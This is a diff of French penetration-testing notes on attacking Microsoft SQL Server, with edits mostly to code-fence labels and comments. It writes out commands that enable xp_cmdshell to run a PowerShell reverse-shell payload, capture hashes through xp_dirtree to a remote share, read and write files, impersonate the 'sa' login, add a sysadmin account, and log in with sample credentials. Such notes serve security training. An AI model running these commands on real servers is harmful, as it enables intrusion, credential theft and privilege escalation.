@@ -100,7 +100,7 @@ sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
 Equivalent de sqlcmd sous Windows, pour Linux.
 Comme sous windows, on ajoutera le mot clé `GO` à chaque requête afin qu'elle soit exécutée.
 
-```she
+```bash
 # Authentificatino Interne (SQL Server)
 sqsh -S $TARGET_IP -U $AD_USER -P $AD_PASSWORD
 
@@ -112,25 +112,24 @@ sqsh -S $TARGET_IP -U .\\$AD_USER -P $AD_PASSWORD
 
 **Attention** : ce client n'accepte pas les requêtes sur plusieurs lignes.
 
-```sql
--- Internal Authentication (no fomzin prefix)
+```bash
+# Internal Authentication (no fomzin prefix)
 mssqlclient.py -p 1433  $USER:$PASS@$TARGET_IP 
 
---
+# Local workstation authentication 
 mssqlclient.py Administrator@10.129.201.248 -windows-auth
 
--- Local workstation account authentication (no need to add WIN-02 to hosts)
+# Local workstation account authentication (no need to add WIN-02 to hosts)
 mssqlclient.py -p 1433 -windows-auth WIN-02/mssqlsvc:princess1@$TARGET_IP      
 ```
 
 ## Commandes utiles
 
-
 ### Exploitation
 
 #### Exécution de commandes (xp_cmdshell)
 
-```
+```sql
 ------------------------------------------------------------------------
 -- Tentative d activation de xp_cmdshell  (si droits suffisants)
 -- Allow advanced options to be changed.  
@@ -148,16 +147,18 @@ xp_cmdshell 'powershell -e <hoaxshell payload>';
 
 #### Capture de Hash
 
-```
+```sql
 -- XP_DIRTREE
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
+```
 
+```sql
 -- XP_SUBDIRS
 EXEC master..xp_subdirs '\\10.10.110.17\share\'
 ```
 
 #### Ecriture dans un fichier
-```
+```sql
 ------------------------------------------------------------------------
 -- Creation de fichier via OLE Automation Procedures
 
@@ -179,7 +180,7 @@ EXECUTE sp_OADestroy @OLE
 
 #### Lecture d'un fichier
 
-```
+```sql
 SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 ```
 
@@ -195,7 +196,7 @@ EXEC sp_addsrvrolemember 'hacker', 'sysadmin';
 
 Si l'énumération présentée plus haut nous liste des utilisateurs que l'on peut "impersonate" (usurper l'identité), on peut alors utiliser les commandes suivantes :
 
-```
+```sql
 -- Exploitation
 user master; -- db sur laquelle on est sur d'avoir les droits
 EXECUTE AS LOGIN = 'sa';
@@ -207,12 +208,9 @@ REVERT; -- retourne aux droits précédents
 ### Linked Server
 Si on a un serveur lié (voir énumération sur cette page), on peut exécuter des requêtes à distance sur cette machine :
 
-```
+```sql
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
-2> GO
 ```
 
 
-
-
-There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.
+There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.
